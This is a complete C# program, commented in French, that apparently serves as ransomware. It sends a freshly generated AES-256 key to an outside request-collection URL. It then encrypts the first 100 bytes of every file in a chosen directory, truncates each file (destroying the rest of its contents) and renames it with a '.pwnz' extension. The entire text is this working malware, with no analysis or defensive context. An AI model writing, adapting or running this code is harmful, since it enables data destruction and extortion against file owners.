using System;
using System.IO;
using System.Security.Cryptography;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

class Program
{
    static readonly HttpClient client = new HttpClient();

    static async Task Main(string[] args)
    {
        if (args.Length == 0)
        {
            Console.WriteLine("Veuillez spécifier un répertoire.");
            return;
        }

        string directoryPath = args[0];
        DirectoryInfo di = new DirectoryInfo(directoryPath);

        using (Aes aesAlg = Aes.Create())
        {
            aesAlg.KeySize = 256; // Utilisation d'une clé AES de 256 bits
            aesAlg.GenerateKey(); // Génération d'une clé aléatoire

            // Envoi de la clé AES
            await SendKeyAsync(Convert.ToBase64String(aesAlg.Key));

            foreach (FileInfo file in di.GetFiles())
            {
                EncryptFile(file, aesAlg);
            }
        }
    }

    static void EncryptFile(FileInfo fileInfo, Aes aesAlg)
    {
        byte[] fileBytes = File.ReadAllBytes(fileInfo.FullName);
        byte[] encryptedBytes;

        using (MemoryStream msEncrypt = new MemoryStream())
        {
            using (ICryptoTransform encryptor = aesAlg.CreateEncryptor())
            {
                using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                {
                    // Chiffrement des 100 premiers octets ou du fichier entier si sa taille est inférieure
                    csEncrypt.Write(fileBytes, 0, Math.Min(100, fileBytes.Length));
                }

                encryptedBytes = msEncrypt.ToArray();
            }
        }

        // Réécriture du fichier avec les données chiffrées
        using (FileStream fs = fileInfo.OpenWrite())
        {
            fs.Write(encryptedBytes, 0, encryptedBytes.Length);
            fs.SetLength(encryptedBytes.Length); // Ajustement de la taille du fichier si nécessaire
        }

        // Renommage du fichier avec l'extension .pwnz
        File.Move(fileInfo.FullName, Path.ChangeExtension(fileInfo.FullName, ".pwnz"));
    }

    static async Task SendKeyAsync(string key)
    {
        var content = new StringContent(key, Encoding.UTF8, "text/plain");
        var response = await client.PostAsync("https://en4a3z09mtjsq.x.pipedream.net/", content);
        response.EnsureSuccessStatusCode();
    }
}
